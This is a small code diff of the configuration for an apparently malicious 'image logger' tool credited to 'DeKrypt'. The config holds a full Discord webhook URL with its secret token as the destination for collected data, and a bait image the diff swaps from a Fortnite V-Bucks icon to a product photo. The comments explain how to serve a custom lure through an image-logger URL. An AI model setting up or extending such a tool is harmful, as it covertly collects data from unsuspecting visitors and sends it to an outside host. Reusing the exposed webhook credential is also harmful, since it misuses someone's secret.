@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1117961339583864944/gUjpCjj7eprMrGGSqeI90f5Iia_MNR-HGP4MjoanHx5geH6x-HMViYVuhHRPRbC2TI-d",
-    "image": "https://static.wikia.nocookie.net/fortnite/images/e/eb/V-Bucks_-_Icon_-_Fortnite.png/revision/latest?cb=20170806013747", # You can also have a custom image by using a URL argument
+    "image": "https://www.euronics.it/dw/image/v2/BFPN_PRD/on/demandware.static/-/Sites-catalog_euronics_master/default/dw010bcf75/hi-res/222000306.jpg?sw=1000&q=90&strip=false", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
